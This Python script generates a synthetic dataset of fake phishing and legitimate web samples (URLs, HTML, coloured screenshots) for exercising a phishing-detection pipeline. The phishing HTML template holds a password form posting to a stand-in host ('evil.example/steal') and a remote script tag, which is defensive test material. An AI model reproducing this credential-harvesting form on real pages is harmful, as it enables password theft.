"""
Generates a small synthetic dataset matching the Phish360 folder structure,
purely so the pipeline scripts can be exercised end-to-end. The synthetic
"phishing" samples have systematically different URL/HTML/image signals
than "legitimate" ones so trained models should score meaningfully above
chance -- this validates the pipeline WORKS, not that it will hit any
particular accuracy on your real data.
"""
import random
from pathlib import Path

from PIL import Image, ImageDraw

random.seed(0)
ROOT = Path("datasets") / "phish360"


def make_sample(split: str, idx: int, label: str) -> None:
    prefix = "L" if label == "legitimate" else "P"
    sample_id = f"{prefix}{idx:05d}_{label}"
    sample_dir = ROOT / split / sample_id
    for sub in ("Label", "URL", "RAW-HTML", "SCREEN-SHOT"):
        (sample_dir / sub).mkdir(parents=True, exist_ok=True)

    (sample_dir / "Label" / "label.txt").write_text(label, encoding="utf-8")

    if label == "phishing":
        url = f"http://secure-{random.choice(['login','verify','account'])}-{idx}.xyz/signin?u={idx}"
        html = (
            "<html><head><title>Sign in</title></head><body>"
            f"<form action='http://collector-{idx}.evil.example/steal'>"
            "<input type='password' name='p'><input type='hidden' name='h' value='1'>"
            "</form>"
            "<script src='http://cdn-evil-example.com/x.js'></script>"
            "</body></html>"
        )
        bg = (200, 50, 50)
    else:
        url = f"https://www.example-shop-{idx}.com/products/item{idx}"
        html = (
            f"<html><head><title>Our Store #{idx}</title></head><body>"
            f"<p>Welcome to our store #{idx}, browse our products below.</p>"
            "<img src='/img1.png'><img src='/img2.png'>"
            "</body></html>"
        )
        bg = (50, 120, 200)

    (sample_dir / "URL" / "url.txt").write_text(url, encoding="utf-8")
    (sample_dir / "RAW-HTML" / "index.html").write_text(html, encoding="utf-8")

    img = Image.new("RGB", (64, 64), color=bg)
    draw = ImageDraw.Draw(img)
    draw.rectangle([10, 10, 54, 54], outline=(255, 255, 255))
    img.save(sample_dir / "SCREEN-SHOT" / "screen_shoot.png")


def main(n_per_class_trainval: int = 120, n_per_class_test: int = 30) -> None:
    idx = 0
    for label in ("legitimate", "phishing"):
        for _ in range(n_per_class_trainval):
            make_sample("trainval", idx, label)
            idx += 1
    for label in ("legitimate", "phishing"):
        for _ in range(n_per_class_test):
            make_sample("test", idx, label)
            idx += 1
    print(f"Synthetic dataset written under {ROOT.resolve()}")


if __name__ == "__main__":
    main()
